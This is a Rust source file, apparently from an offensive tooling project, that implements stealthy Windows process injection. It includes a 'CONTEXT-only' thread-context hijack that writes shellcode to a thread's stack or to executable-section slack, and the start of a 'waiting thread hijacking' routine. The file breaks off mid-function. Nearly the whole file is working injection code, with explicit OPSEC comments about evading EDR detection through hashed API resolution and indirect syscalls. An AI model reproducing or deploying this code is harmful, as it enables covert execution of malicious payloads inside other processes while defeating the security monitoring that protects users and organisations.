// Modifies only a thread's CONTEXT structure (RIP/RSP registers) to redirect
// execution to payload bytes written to the target thread's stack or an
// existing executable section. No VirtualAllocEx, no WriteProcessMemory for
// allocation, no CreateRemoteThread.
//
// OPSEC: The only NT API calls involved are:
//   NtOpenThread, NtGetContextThread, NtSetContextThread,
//   NtWriteVirtualMemory (one call, to stack or existing section),
//   optionally NtResumeThread / NtAlertThread.
//
// This is the minimum-signal injection possible — it evades EDR that
// correlates "2 of 3" signals (alloc + write + execute).

/// Maximum payload size for stack-based delivery (Method A).
/// Stack-based delivery is preferred because writing to the thread's own
/// stack is less flagged than writing to executable memory.
const CONTEXT_ONLY_STACK_PAYLOAD_LIMIT: usize = 2048;

/// Offset below the current RSP where we write the payload on the stack.
/// 0x2000 (8 KB) keeps us clear of active stack frames.
const STACK_WRITE_OFFSET: usize = 0x2000;

/// NT information class for extended thread information.
const SYSTEM_THREAD_INFORMATION: u32 = 0x05;

/// Wait reasons that indicate a thread is safe to hijack.
const KTHREAD_WAIT_REASON_DELAY_EXECUTION: u8 = 14; // WrDelayExecution
const KTHREAD_WAIT_REASON_SUSPENDED: u8 = 5;        // Suspended
const KTHREAD_WAIT_REASON_WRQUEUE: u8 = 16;          // WrQueue — avoid
const KTHREAD_WAIT_REASON_EXECUTIVE: u8 = 6;         // Executive — avoid

/// SYSTEM_THREAD_INFORMATION entry (per-thread, inside SYSTEM_PROCESS_INFORMATION).
///
/// This is the thread array embedded within each SYSTEM_PROCESS_INFORMATION
/// entry.  The array starts immediately after the process entry's variable-length
/// ImageName buffer.
///
/// Layout (x86-64):
///   +0x00  KernelTime      (LARGE_INTEGER, 8)
///   +0x08  UserTime        (LARGE_INTEGER, 8)
///   +0x10  CreateTime      (LARGE_INTEGER, 8)
///   +0x18  WaitTime        (ULONG, 4)
///   +0x1C  StartAddress    (PVOID, 8)
///   +0x24  [padding 4]
///   +0x28  ClientId        (CLIENT_ID: UniqueProcess 8 + UniqueThread 8)
///   +0x38  Priority        (KPRIORITY, 4)
///   +0x3C  BasePriority    (KPRIORITY, 4)
///   +0x40  ContextSwitchCount (ULONG, 4)
///   +0x44  State           (THREAD_STATE, 1)
///   +0x45  WaitReason      (KWAIT_REASON, 1)
#[repr(C)]
#[derive(Default)]
struct SystemThreadInformation {
    kernel_time: u64,
    user_time: u64,
    create_time: u64,
    wait_time: u32,
    _start_addr_pad: u32,
    start_address: u64,
    client_id: [u64; 2], // [UniqueProcess, UniqueThread]
    priority: i32,
    base_priority: i32,
    context_switch_count: u32,
    state: u8,
    wait_reason: u8,
}

/// Execute CONTEXT-only injection into `pid`.
///
/// If `target_tid` is provided, that specific thread is used; otherwise the
/// engine enumerates threads of the target process and selects the best
/// candidate (prefer waiting/suspended threads).
///
/// # Algorithm
///
/// 1. Enumerate threads via `NtQuerySystemInformation(SystemProcessInformation)`
/// 2. Select a suitable thread (wait state preferred)
/// 3. Write payload to stack (Method A, ≤2KB) or existing executable section
///    (Method B, >2KB)
/// 4. Modify the thread's CONTEXT to redirect RIP to the payload
/// 5. Resume/signal the thread
/// 6. Wait for completion and restore original context
///
/// # Fallback
///
/// If CONTEXT-only fails (no suitable threads, can't write), falls back to
/// `ThreadHijack` technique.
fn inject_context_only(
    pid: u32,
    target_tid: Option<u32>,
    payload: &[u8],
) -> Result<InjectionHandle, InjectionError> {
    unsafe {
        // ── Step 0: Resolve NT API functions via pe_resolve ─────────────
        let ntdll_base = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)
            .ok_or_else(|| InjectionError::InjectionFailed {
                technique: InjectionTechnique::ContextOnly,
                reason: "cannot resolve ntdll base".to_string(),
            })?;

        // Resolve NtGetContextThread and NtSetContextThread for indirect syscall.
        let _nt_get_ctx = nt_syscall::get_syscall_id("NtGetContextThread").map_err(|e| {
            InjectionError::InjectionFailed {
                technique: InjectionTechnique::ContextOnly,
                reason: format!("cannot resolve NtGetContextThread: {e}"),
            }
        })?;
        let _nt_set_ctx = nt_syscall::get_syscall_id("NtSetContextThread").map_err(|e| {
            InjectionError::InjectionFailed {
                technique: InjectionTechnique::ContextOnly,
                reason: format!("cannot resolve NtSetContextThread: {e}"),
            }
        })?;

        // ── Step 1: Open target process ─────────────────────────────────
        //
        // We need PROCESS_VM_WRITE to write payload to stack/section and
        // PROCESS_QUERY_INFORMATION for thread enumeration.
        let mut client_id = [0u64; 2];
        client_id[0] = pid as u64;
        let mut obj_attr: winapi::shared::ntdef::OBJECT_ATTRIBUTES = std::mem::zeroed();
        obj_attr.Length = std::mem::size_of::<winapi::shared::ntdef::OBJECT_ATTRIBUTES>() as u32;

        let mut h_proc: usize = 0;
        // PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION
        let access_mask: u64 = 0x0020 | 0x0008 | 0x0400;
        let open_status = nt_syscall::syscall!(
            "NtOpenProcess",
            &mut h_proc as *mut _ as u64,
            access_mask,
            &mut obj_attr as *mut _ as u64,
            client_id.as_mut_ptr() as u64,
        );

        if open_status.is_err() || open_status.unwrap() < 0 || h_proc == 0 {
            return Err(InjectionError::InjectionFailed {
                technique: InjectionTechnique::ContextOnly,
                reason: format!("NtOpenProcess({}) failed for context-only injection", pid),
            });
        }
        let h_proc = h_proc as *mut c_void;

        macro_rules! cleanup_and_err {
            ($msg:expr) => {{
                let _ = nt_syscall::syscall!("NtClose", h_proc as u64);
                return Err(InjectionError::InjectionFailed {
                    technique: InjectionTechnique::ContextOnly,
                    reason: $msg.to_string(),
                });
            }};
        }

        // ── Step 2: Find a suitable thread ──────────────────────────────
        let candidate_tid = match target_tid {
            Some(tid) => tid,
            None => {
                match find_best_thread(pid) {
                    Some(tid) => tid,
                    None => {
                        // No suitable thread found — fall back to ThreadHijack.
                        log::warn!(
                            "injection_engine: ContextOnly: no suitable thread in pid {}, \
                             falling back to ThreadHijack",
                            pid,
                        );
                        let _ = nt_syscall::syscall!("NtClose", h_proc as u64);
                        return inject_thread_hijack(pid, payload);
                    }
                }
            }
        };

        log::info!(
            "injection_engine: ContextOnly: selected thread {} in pid {}",
            candidate_tid,
            pid,
        );

        // ── Step 3: Open the target thread ──────────────────────────────
        //
        // THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME
        let thread_access: u64 = 0x0008 | 0x0010 | 0x0002;
        let mut thread_client_id = [0u64; 2];
        thread_client_id[0] = pid as u64;
        thread_client_id[1] = candidate_tid as u64;

        let mut obj_attr2: winapi::shared::ntdef::OBJECT_ATTRIBUTES = std::mem::zeroed();
        obj_attr2.Length = std::mem::size_of::<winapi::shared::ntdef::OBJECT_ATTRIBUTES>() as u32;

        let mut h_thread: usize = 0;
        let open_thread_status = nt_syscall::syscall!(
            "NtOpenThread",
            &mut h_thread as *mut _ as u64,
            thread_access,
            &mut obj_attr2 as *mut _ as u64,
            thread_client_id.as_mut_ptr() as u64,
        );

        if open_thread_status.is_err() || open_thread_status.unwrap() < 0 || h_thread == 0 {
            cleanup_and_err!(format!(
                "NtOpenThread(tid={}) failed", candidate_tid
            ));
        }
        let h_thread = h_thread as *mut c_void;

        // ── Step 4: Snapshot the thread's current CONTEXT ───────────────
        let mut ctx: winapi::um::winnt::CONTEXT = std::mem::zeroed();
        ctx.ContextFlags = winapi::um::winnt::CONTEXT_FULL;

        let get_ctx_status = nt_syscall::syscall!(
            "NtGetContextThread",
            h_thread as u64,
            &mut ctx as *mut _ as u64,
        );

        if get_ctx_status.is_err() || get_ctx_status.unwrap() < 0 {
            let _ = nt_syscall::syscall!("NtClose", h_thread as u64);
            cleanup_and_err!("NtGetContextThread failed");
        }

        let original_rip = ctx.Rip;
        let original_rsp = ctx.Rsp;
        let original_rbp = ctx.Rbp;

        log::debug!(
            "injection_engine: ContextOnly: thread {} original context: RIP={:#x} RSP={:#x} RBP={:#x}",
            candidate_tid,
            original_rip,
            original_rsp,
            original_rbp,
        );

        // ── Step 5: Write payload + trampoline ──────────────────────────
        //
        // Build the "restore trampoline" that will be appended after the payload.
        // The trampoline restores the thread's original registers and returns
        // to the original RIP:
        //
        //   mov rsp, <original_rsp>
        //   mov rbp, <original_rbp>
        //   push <original_rip>     ; push return address
        //   ret                     ; jump to original RIP
        //
        // x86-64 encoding:
        //   mov rsp, imm64          → 48 BC <8 bytes>
        //   mov rbp, imm64          → 48 BD <8 bytes>
        //   push imm64 (sign-ext)   → 68 <4 bytes>  (if fits in i32) OR
        //   mov rax, imm64; push rax → 48 B8 <8 bytes> 50

        let trampoline = build_restore_trampoline(original_rip, original_rsp, original_rbp);

        // Combined payload = shellcode + trampoline
        let mut combined = payload.to_vec();
        combined.extend_from_slice(&trampoline);

        let combined_len = combined.len();

        // Choose delivery method based on payload size.
        let (write_addr, delivery_method) = if combined_len <= CONTEXT_ONLY_STACK_PAYLOAD_LIMIT {
            // ── Method A: Stack-based delivery ───────────────────────────
            //
            // Write the payload + trampoline to the thread's stack, below the
            // current RSP in unused stack space. This requires a single
            // NtWriteVirtualMemory call to the stack, which is less flagged
            // than allocating new executable memory.

            let stack_write_addr = if original_rsp > STACK_WRITE_OFFSET as u64 {
                original_rsp - STACK_WRITE_OFFSET as u64
            } else {
                // Stack is too small — fall back.
                let _ = nt_syscall::syscall!("NtClose", h_thread as u64);
                cleanup_and_err!("stack too small for CONTEXT-only payload delivery");
            };

            // Align down to 16 bytes for stack alignment.
            let stack_write_addr = stack_write_addr & !0xF;

            log::debug!(
                "injection_engine: ContextOnly: Method A (stack), writing {} bytes at {:#x} \
                 (RSP={:#x}, offset=0x{:x})",
                combined_len,
                stack_write_addr,
                original_rsp,
                original_rsp - stack_write_addr,
            );

            (stack_write_addr, "stack")
        } else {
            // ── Method B: Section-based delivery ─────────────────────────
            //
            // Find an existing executable section with slack space (padding
            // of 0x00/0xCC bytes) and write the payload there. This is even
            // lower signal because writing to .text padding looks like a
            // hotpatch.

            match find_executable_slack(h_proc, combined_len) {
                Some(addr) => {
                    log::debug!(
                        "injection_engine: ContextOnly: Method B (section), writing {} bytes \
                         at {:#x} in existing executable region",
                        combined_len,
                        addr,
                    );
                    (addr, "section")
                }
                None => {
                    // No executable slack found. Fall back to stack delivery
                    // even for larger payloads (the stack is typically large
                    // enough, we just prefer stack for small payloads).
                    let stack_write_addr = if original_rsp > STACK_WRITE_OFFSET as u64 {
                        (original_rsp - STACK_WRITE_OFFSET as u64) & !0xF
                    } else {
                        let _ = nt_syscall::syscall!("NtClose", h_thread as u64);
                        cleanup_and_err!(
                            "no executable slack found and stack too small for section delivery"
                        );
                    };
                    (stack_write_addr, "stack-oversize")
                }
            }
        };

        // ── Write the combined payload + trampoline ─────────────────────
        let mut written = 0usize;
        let write_status = nt_syscall::syscall!(
            "NtWriteVirtualMemory",
            h_proc as u64,
            write_addr as u64,
            combined.as_ptr() as u64,
            combined_len as u64,
            &mut written as *mut _ as u64,
        );

        if write_status.is_err() || write_status.unwrap() < 0 || written != combined_len {
            let _ = nt_syscall::syscall!("NtClose", h_thread as u64);
            cleanup_and_err!(format!(
                "NtWriteVirtualMemory to {} failed (written={}/{})",
                delivery_method, written, combined_len
            ));
        }

        log::info!(
            "injection_engine: ContextOnly: wrote {} bytes at {:#x} via {} delivery",
            combined_len,
            write_addr,
            delivery_method,
        );

        // ── Step 6: Modify the thread's CONTEXT ─────────────────────────
        //
        // Set RIP to the payload address. For stack delivery, also adjust
        // RSP to point above the payload (so the payload has stack space).
        // RCX/RDX can carry arguments if the payload expects them.

        ctx.Rip = write_addr;

        // For stack delivery, set RSP to just below the payload so the
        // payload has room for its own stack frames above.
        if delivery_method.starts_with("stack") {
            // Set RSP to the write_addr minus some space for the payload's
            // own stack usage. The payload's trampoline will restore the
            // original RSP.
            ctx.Rsp = write_addr - 0x200; // 512 bytes for payload stack
        }

        // Flush I-cache for the written region (important for section delivery).
        let _ = nt_syscall::syscall!(
            "NtFlushInstructionCache",
            h_proc as u64,
            write_addr as u64,
            combined_len as u64,
        );

        let set_ctx_status = nt_syscall::syscall!(
            "NtSetContextThread",
            h_thread as u64,
            &ctx as *const _ as u64,
        );

        if set_ctx_status.is_err() || set_ctx_status.unwrap() < 0 {
            // Failed to set context — try to restore and clean up.
            ctx.Rip = original_rip;
            ctx.Rsp = original_rsp;
            ctx.Rbp = original_rbp;
            let _ = nt_syscall::syscall!(
                "NtSetContextThread",
                h_thread as u64,
                &ctx as *const _ as u64,
            );
            let _ = nt_syscall::syscall!("NtClose", h_thread as u64);
            cleanup_and_err!("NtSetContextThread failed");
        }

        log::info!(
            "injection_engine: ContextOnly: set thread {} RIP={:#x}, RSP={:#x}",
            candidate_tid,
            ctx.Rip,
            ctx.Rsp,
        );

        // ── Step 7: Resume / signal the thread ──────────────────────────
        //
        // If the thread was suspended, resume it. If it's in a wait state
        // on an alertable wait, alert it to break the wait.

        // Try NtResumeThread first (works for suspended threads).
        let mut suspend_count: u32 = 0;
        let resume_status = nt_syscall::syscall!(
            "NtResumeThread",
            h_thread as u64,
            &mut suspend_count as *mut _ as u64,
        );

        if resume_status.is_ok() && resume_status.unwrap() >= 0 && suspend_count > 0 {
            log::info!(
                "injection_engine: ContextOnly: resumed thread {} (suspend count was {})",
                candidate_tid,
                suspend_count,
            );
        } else {
            // Thread wasn't suspended — try NtAlertThread to break an
            // alertable wait. If the thread is in a non-alertable wait,
            // this is a no-op and the thread will execute from the modified
            // RIP when the wait resolves naturally.
            let alert_status = nt_syscall::syscall!(
                "NtAlertThread",
                h_thread as u64,
            );
            if alert_status.is_ok() && alert_status.unwrap() >= 0 {
                log::info!(
                    "injection_engine: ContextOnly: alerted thread {} to break wait",
                    candidate_tid,
                );
            } else {
                log::debug!(
                    "injection_engine: ContextOnly: thread {} not suspended/alertable; \
                     context modified, will execute when wait resolves",
                    candidate_tid,
                );
            }
        }

        // ── Step 8: Wait for payload completion ─────────────────────────
        //
        // Wait up to 10 seconds for the payload to complete. The trampoline
        // at the end of the payload restores the original context, so the
        // thread should return to its original execution path.
        //
        // We poll by periodically reading the thread's RIP via
        // NtGetContextThread to see if it has returned to the original RIP
        // or near it (within the original module).
        let wait_start = std::time::Instant::now();
        let wait_timeout = std::time::Duration::from_secs(10);
        let mut payload_completed = false;

        // Brief sleep to let the thread start executing.
        std::thread::sleep(std::time::Duration::from_millis(100));

        while wait_start.elapsed() < wait_timeout {
            let mut check_ctx: winapi::um::winnt::CONTEXT = std::mem::zeroed();
            check_ctx.ContextFlags = winapi::um::winnt::CONTEXT_CONTROL;

            let check_status = nt_syscall::syscall!(
                "NtGetContextThread",
                h_thread as u64,
                &mut check_ctx as *mut _ as u64,
            );

            if check_status.is_ok() && check_status.unwrap() >= 0 {
                // Check if RIP has returned to the original location or is
                // in a system call (which means the thread is back to normal).
                let current_rip = check_ctx.Rip;

                // If RIP is back to original or in kernel space (high bits set),
                // the payload has completed.
                if current_rip == original_rip
                    || current_rip == 0
                    || (current_rip & 0xFFF_0000_0000_0000) != 0
                {
                    payload_completed = true;
                    break;
                }
            }

            std::thread::sleep(std::time::Duration::from_millis(200));
        }

        if payload_completed {
            log::info!(
                "injection_engine: ContextOnly: payload completed in thread {} after {}ms",
                candidate_tid,
                wait_start.elapsed().as_millis(),
            );
        } else {
            log::warn!(
                "injection_engine: ContextOnly: payload may still be executing in thread {} \
                 after 10s timeout — context was modified successfully",
                candidate_tid,
            );
        }

        // ── Step 9: Cleanup ─────────────────────────────────────────────
        //
        // For stack-based delivery: zero out the payload bytes on the stack
        // via NtWriteVirtualMemory (write zeros).
        if delivery_method.starts_with("stack") {
            let zero_buf = vec![0u8; combined_len];
            let mut zero_written = 0usize;
            let _ = nt_syscall::syscall!(
                "NtWriteVirtualMemory",
                h_proc as u64,
                write_addr as u64,
                zero_buf.as_ptr() as u64,
                combined_len as u64,
                &mut zero_written as *mut _ as u64,
            );
            log::debug!(
                "injection_engine: ContextOnly: zeroed {} bytes on stack at {:#x}",
                zero_written,
                write_addr,
            );
        }

        // Close thread handle.
        let _ = nt_syscall::syscall!("NtClose", h_thread as u64);

        // Return handle with the write address as injected_base_addr.
        // process_handle is kept for potential eject/cleanup.
        Ok(InjectionHandle {
            target_pid: pid,
            technique_used: InjectionTechnique::ContextOnly,
            injected_base_addr: write_addr as usize,
            payload_size: payload.len(),
            thread_handle: None, // Thread handle closed; thread continues normally
            process_handle: h_proc,
            sleep_enrolled: false,
            sleep_stub_addr: 0,
        })
    }
}

/// Build an x86-64 restore trampoline that restores the thread's original
/// RSP, RBP, and returns to the original RIP.
///
/// The trampoline:
///   mov rsp, <original_rsp>
///   mov rbp, <original_rbp>
///   mov rax, <original_rip>      ; push requires sign-extended imm32;
///   push rax                      ; so we use movabs+push for generality
///   ret
fn build_restore_trampoline(original_rip: u64, original_rsp: u64, original_rbp: u64) -> Vec<u8> {
    let mut trampoline = Vec::with_capacity(48);

    // mov rsp, <original_rsp>  → 48 BC <imm64>
    trampoline.push(0x48);
    trampoline.push(0xBC);
    trampoline.extend_from_slice(&original_rsp.to_le_bytes());

    // mov rbp, <original_rbp>  → 48 BD <imm64>
    trampoline.push(0x48);
    trampoline.push(0xBD);
    trampoline.extend_from_slice(&original_rbp.to_le_bytes());

    // mov rax, <original_rip>  → 48 B8 <imm64>
    trampoline.push(0x48);
    trampoline.push(0xB8);
    trampoline.extend_from_slice(&original_rip.to_le_bytes());

    // push rax  → 50
    trampoline.push(0x50);

    // ret  → C3
    trampoline.push(0xC3);

    trampoline
}

/// Find the best candidate thread for CONTEXT-only injection in the target
/// process.
///
/// Enumerates threads via `NtQuerySystemInformation(SystemProcessInformation)`
/// and selects a thread in a suitable wait state. Prefers threads in
/// DelayExecution or Suspended state; avoids Executive or WrQueue.
///
/// Returns `Some(tid)` if a suitable thread is found, `None` otherwise.
fn find_best_thread(target_pid: u32) -> Option<u32> {
    unsafe {
        let ntdll = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)?;

        let qsi_addr = pe_resolve::get_proc_address_by_hash(
            ntdll,
            pe_resolve::hash_str(b"NtQuerySystemInformation\0"),
        )?;

        let qsi: extern "system" fn(u32, *mut u8, u32, *mut u32) -> i32 =
            std::mem::transmute(qsi_addr);

        let mut buf_len: u32 = 0x40000;
        let mut ret_len: u32 = 0;

        // Query system information with retries for buffer size.
        let buf: Vec<u8> = loop {
            let mut b = Vec::with_capacity(buf_len as usize);
            b.set_len(buf_len as usize);

            let status = qsi(SYSTEM_PROCESS_INFORMATION, b.as_mut_ptr(), buf_len, &mut ret_len);

            if status >= 0 {
                break b;
            }

            if status as u32 == 0xC0000004 {
                // STATUS_INFO_LENGTH_MISMATCH
                if buf_len > 0x400000 {
                    return None; // Safety limit
                }
                buf_len = if ret_len > buf_len { ret_len } else { buf_len * 2 };
            } else {
                return None;
            }
        };

        // Parse the buffer to find threads belonging to our target PID.
        let mut offset: usize = 0;
        let mut best_tid: Option<u32> = None;
        let mut best_score: i32 = -1;

        loop {
            if offset + 0x60 > buf.len() {
                break;
            }

            let next_entry = u32::from_le_bytes([
                buf[offset],
                buf[offset + 1],
                buf[offset + 2],
                buf[offset + 3],
            ]);

            let num_threads = u32::from_le_bytes([
                buf[offset + 4],
                buf[offset + 5],
                buf[offset + 6],
                buf[offset + 7],
            ]);

            let pid = u64::from_le_bytes([
                buf[offset + 0x50],
                buf[offset + 0x51],
                buf[offset + 0x52],
                buf[offset + 0x53],
                buf[offset + 0x54],
                buf[offset + 0x55],
                buf[offset + 0x56],
                buf[offset + 0x57],
            ]) as u32;

            if pid == target_pid {
                // Parse threads for this process.
                // The thread array starts after the variable-length ImageName.
                // ImageName is a UNICODE_STRING at offset +0x38:
                //   Length (2) + MaxLength (2) + [pad 4] + Buffer (8)
                // After the UNICODE_STRING header (16 bytes), we have:
                //   BasePriority (8 bytes on x64)
                //   UniqueProcessId (8)
                //   InheritedFromUniqueProcessId (8)
                //
                // The total fixed-size portion of SYSTEM_PROCESS_INFORMATION
                // before the thread array is:
                //   NextEntryOffset (4) + NumberOfThreads (4) +
                //   WorkingSetPrivateSize (8) + HardFaultCount (4) +
                //   NumberOfThreadsHighWatermark (4) + CycleTime (8) +
                //   CreateTime (8) + UserTime (8) + KernelTime (8) +
                //   ImageName (UNICODE_STRING = 16) + BasePriority (8 on x64) +
                //   UniqueProcessId (8) + InheritedFromUniqueProcessId (8)
                //
                // The ImageName.Buffer pointer may be non-null, in which case
                // the actual string data may be stored elsewhere. But for
                // SystemProcessInformation, the string data is inline after
                // the UNICODE_STRING header (the Buffer points into the same
                // allocation). The actual layout uses MaximumLength of the
                // UNICODE_STRING to determine the variable-size portion.
                //
                // After the variable-size name, the thread array begins.
                //
                // On Windows 10+, the layout is:
                //   Fixed header: 0x68 bytes
                //   ImageName (UNICODE_STRING): 16 bytes at +0x38
                //   The name string data: MaximumLength bytes (aligned to 8)
                //   Then thread array starts

                let name_max_len = u16::from_le_bytes([
                    buf[offset + 0x3A],
                    buf[offset + 0x3B],
                ]) as usize;

                // Align name data to 8 bytes
                let name_aligned = (name_max_len + 7) & !7;
                let thread_array_start = offset + 0x48 + name_aligned;

                // Each SYSTEM_THREAD_INFORMATION is 0x48 bytes on x64.
                // (We use a slightly larger size for safety.)
                const THREAD_ENTRY_SIZE: usize = 0x48;

                for i in 0..num_threads as usize {
                    let thread_offset = thread_array_start + i * THREAD_ENTRY_SIZE;
                    if thread_offset + THREAD_ENTRY_SIZE > buf.len() {
                        break;
                    }

                    // ClientId at +0x28: [UniqueProcess, UniqueThread]
                    let thread_pid = u64::from_le_bytes([
                        buf[thread_offset + 0x28],
                        buf[thread_offset + 0x29],
                        buf[thread_offset + 0x2A],
                        buf[thread_offset + 0x2B],
                        buf[thread_offset + 0x2C],
                        buf[thread_offset + 0x2D],
                        buf[thread_offset + 0x2E],
                        buf[thread_offset + 0x2F],
                    ]) as u32;

                    let thread_tid = u64::from_le_bytes([
                        buf[thread_offset + 0x30],
                        buf[thread_offset + 0x31],
                        buf[thread_offset + 0x32],
                        buf[thread_offset + 0x33],
                        buf[thread_offset + 0x34],
                        buf[thread_offset + 0x35],
                        buf[thread_offset + 0x36],
                        buf[thread_offset + 0x37],
                    ]) as u32;

                    // State at +0x44
                    let _thread_state = buf[thread_offset + 0x44];

                    // WaitReason at +0x45
                    let wait_reason = buf[thread_offset + 0x45];

                    if thread_pid != target_pid || thread_tid == 0 {
                        continue;
                    }

                    // Score the thread based on wait reason.
                    let score = match wait_reason {
                        KTHREAD_WAIT_REASON_SUSPENDED => 100, // Best: definitely idle
                        KTHREAD_WAIT_REASON_DELAY_EXECUTION => 90, // Sleeping thread
                        0..=4 => 50,   // Waiting for various objects (moderate)
                        7..=13 => 30,  // Other wait reasons (lower priority)
                        _ => 10,       // Unknown/other
                    };

                    // Skip Executive and WrQueue — these threads are doing work.
                    if wait_reason == KTHREAD_WAIT_REASON_EXECUTIVE
                        || wait_reason == KTHREAD_WAIT_REASON_WRQUEUE
                    {
                        continue;
                    }

                    if score > best_score {
                        best_score = score;
                        best_tid = Some(thread_tid);
                    }
                }
            }

            if next_entry == 0 {
                break;
            }
            offset += next_entry as usize;
        }

        best_tid
    }
}

/// Find an existing executable section in the target process with sufficient
/// slack space (between end of code and next section, or padding of 0x00/0xCC
/// bytes) to hold `required_size` bytes.
///
/// Returns the address of the slack region, or `None` if no suitable region
/// is found.
unsafe fn find_executable_slack(
    h_proc: *mut c_void,
    required_size: usize,
) -> Option<usize> {
    use winapi::um::winnt::{
        MEMORY_BASIC_INFORMATION, MEM_COMMIT, PAGE_EXECUTE, PAGE_EXECUTE_READ,
    };

    let mut mbi: MEMORY_BASIC_INFORMATION = std::mem::zeroed();
    let mut addr: usize = 0x10000; // Start scanning from 64KB (skip null page)

    loop {
        let result = nt_syscall::syscall!(
            "NtQueryVirtualMemory",
            h_proc as u64,
            addr as u64,
            0u64, // MemoryBasicInformation
            &mut mbi as *mut _ as u64,
            std::mem::size_of::<MEMORY_BASIC_INFORMATION>() as u64,
            0u64, // ReturnLength (optional)
        );

        if result.is_err() || result.unwrap() < 0 {
            break; // End of address space or error
        }

        // Check if this region is committed, executable, and readable.
        let is_executable = mbi.Protect == PAGE_EXECUTE || mbi.Protect == PAGE_EXECUTE_READ;
        let is_committed = mbi.State == MEM_COMMIT;

        if is_executable && is_committed && mbi.RegionSize >= required_size {
            // Found an executable region — scan for slack space within it.
            // Read the region in chunks and look for a block of zeros or 0xCC.
            let region_base = mbi.BaseAddress as usize;
            let region_size = mbi.RegionSize;

            // Read in 64KB chunks to avoid large allocations.
            let chunk_size = 0x10000.min(region_size);
            let mut chunk = vec![0u8; chunk_size];

            let mut scan_offset: usize = 0;
            while scan_offset + required_size < region_size {
                let read_size = chunk_size.min(region_size - scan_offset);
                let mut bytes_read: usize = 0;

                let rs = nt_syscall::syscall!(
                    "NtReadVirtualMemory",
                    h_proc as u64,
                    (region_base + scan_offset) as u64,
                    chunk.as_mut_ptr() as u64,
                    read_size as u64,
                    &mut bytes_read as *mut _ as u64,
                );

                if rs.is_err() || rs.unwrap() < 0 || bytes_read != read_size {
                    break;
                }

                // Scan for consecutive 0x00 or 0xCC bytes.
                let mut slack_start: Option<usize> = None;
                let mut slack_len: usize = 0;

                for (i, &byte) in chunk[..read_size].iter().enumerate() {
                    if byte == 0x00 || byte == 0xCC {
                        if slack_start.is_none() {
                            slack_start = Some(i);
                        }
                        slack_len += 1;

                        if slack_len >= required_size {
                            let slack_addr = region_base + scan_offset + slack_start.unwrap();
                            // Verify the slack is not at the very start of the region
                            // (which would be a PE header).
                            if slack_addr > region_base + 0x1000 {
                                log::debug!(
                                    "injection_engine: ContextOnly: found {} bytes of slack \
                                     at {:#x} in executable region {:#x}",
                                    slack_len,
                                    slack_addr,
                                    region_base,
                                );
                                return Some(slack_addr);
                            }
                            // Reset — this slack is too close to the PE header.
                            slack_start = None;
                            slack_len = 0;
                        }
                    } else {
                        slack_start = None;
                        slack_len = 0;
                    }
                }

                scan_offset += read_size;
            }
        }

        // Advance to next region.
        addr = mbi.BaseAddress as usize + mbi.RegionSize;
        if addr == 0 {
            break; // Overflow
        }
    }

    None
}

// ── NEW: Waiting Thread Hijacking (WTH) ──────────────────────────────────────
//
// Targets threads already in a kernel wait state (Sleep, WaitForSingleObject,
// etc.), reads their stack to find the return address, overwrites that return
// address with the address of the payload. When the wait resolves naturally,
// the thread returns into the payload. No SuspendThread/ResumeThread, no
// CONTEXT modification, no remote thread creation.
//
// OPSEC: The only NT API calls involved are:
//   NtOpenProcess, NtOpenThread, NtGetContextThread (read RSP only),
//   NtReadVirtualMemory (stack read), NtWriteVirtualMemory (payload write +
//   return address overwrite), optionally NtSetEvent/NtReleaseSemaphore.
//
// This is stealthier than classic ThreadHijack because:
//   - No SuspendThread/ResumeThread (major EDR signal)
//   - No CONTEXT modification (NtSetContextThread is hooked by EDR)
//   - No remote thread creation
//   - The thread transitions are natural kernel wait → user-mode return

/// Maximum number of stack frames to walk when searching for the return
/// address. Most wait calls (NtWaitForSingleObject) have the return address
/// at [RSP] or [RSP+8].
const WTH_MAX_STACK_WALK_DEPTH: usize = 16;

/// Maximum stack bytes to read for return address analysis.
const WTH_STACK_READ_SIZE: usize = 256;

/// Wait reasons that indicate a thread is in DelayExecution (Sleep/SleepEx).
/// These are ideal WTH targets because the thread will wake predictably.
const KTHREAD_WAIT_REASON_WR_DELAY_EXECUTION: u8 = 14;

/// Wait reason for WrExecutive — thread waiting on a kernel object.
const KTHREAD_WAIT_REASON_WR_EXECUTIVE: u8 = 6;

/// Wait reason for WrUserRequest — thread waiting for user-mode request.
const KTHREAD_WAIT_REASON_WR_USER_REQUEST: u8 = 14; // Overlaps with DelayExecution on some builds

/// Wait reason for Suspended threads.
const KTHREAD_WAIT_REASON_WR_SUSPENDED: u8 = 5;

/// Wait reason for WrQueue — worker threads doing I/O. Avoid these.
const KTHREAD_WAIT_REASON_WR_QUEUE: u8 = 16;

/// Wait reason for WrDispatchInt — DPC-related. Avoid these.
const KTHREAD_WAIT_REASON_WR_DISPATCH_INT: u8 = 19;

/// Candidate thread info returned by `find_waiting_thread`.
struct WaitingThreadCandidate {
    tid: u32,
    wait_reason: u8,
    score: i32,
}

/// Execute Waiting Thread Hijacking into `pid`.
///
/// If `target_tid` is provided, that specific thread is used; otherwise the
/// engine enumerates threads of the target process and selects the best
/// waiting thread candidate.
///
/// # Algorithm
///
/// 1. Enumerate threads via `NtQuerySystemInformation(SystemProcessInformation)`
/// 2. Select a thread in a suitable wait state (DelayExecution preferred)
/// 3. Read the thread's stack via NtReadVirtualMemory
/// 4. Walk the stack to find the return address (the address the thread
///    will return to when the wait completes)
/// 5. Write payload + trampoline to stack or executable section slack
/// 6. Overwrite the return address on the stack with the payload address
/// 7. Optionally signal the wait object to break the wait early
/// 8. Wait for completion: thread naturally returns into payload, then
///    trampoline restores original return address and returns to caller
///
/// # Fallback
///
/// If WTH fails (no waiting threads, stack read fails, can't find return
/// address), falls back to `ContextOnly`, then `ThreadHijack`.
fn inject_waiting_thread_hijack(
    pid: u32,
    target_tid: Option<u32>,
    payload: &[u8],
) -> Result<InjectionHandle, InjectionError> {
    unsafe {
        // ── Step 0: Resolve NT API functions via pe_resolve ─────────────
        let ntdll_base = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)
            .ok_or_else(|| InjectionError::InjectionFailed {
                technique: InjectionTechnique::WaitingThreadHijack {
                    target_pid: pid,
                    target_tid,
                },
                reason: "cannot resolve ntdll base".to_string(),
            })?;

        // Verify NtGetContextThread is available (we only read RSP, not set).
        let _ = nt_syscall::get_syscall_id("NtGetContextThread").map_err(|e| {
            InjectionError::InjectionFailed {
